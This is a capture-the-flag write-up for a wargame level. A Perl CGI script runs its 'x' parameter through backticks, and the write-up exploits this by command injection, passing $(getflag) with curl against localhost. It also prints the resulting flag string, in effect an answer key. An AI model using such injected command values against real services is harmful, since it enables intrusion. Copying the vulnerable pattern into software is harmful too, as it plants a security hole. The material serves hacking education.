# Level04

### Tools


### How to solve it

1. After loging in using ssh in level04@(vmIP): 
```
ssh level04@000.000.000.000 -p 4242
```
2. We use the ls command and it shows level03 file
```
level04.pl
```
3. Then we run it and it only print a string on the screen, then we cat it and we see the script:
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));Exploit me
```
4. Analyzing this program we can get this info:
```
This is a perl progra
When executing it works with a subprocess x
The sub x take the parameters and get the first string of it[$_[0]
The echo function with rediction of the output from stdin to stdout print the result of the executed command
```
5. After analyzing that, we try
```
curl localhost:4747?x=testing
```
6. So now we know that this program is being executed and getting x value.
7. We want to run a program using this script so we use the command $(getflag) we have multiple ways of doint it 
```
curl localhost:4747?x='$(getflag)' or curl 'http://localhost:4747/?x=$(getflag)'
```
8. And Boom:
```
ne2searoevaevoem4ov4ar8ap

```
### How to protect
 - Once someone is inside your system and if you do not monitor it it's because you failed before,  one additional proction would be implemeting passowords in important files

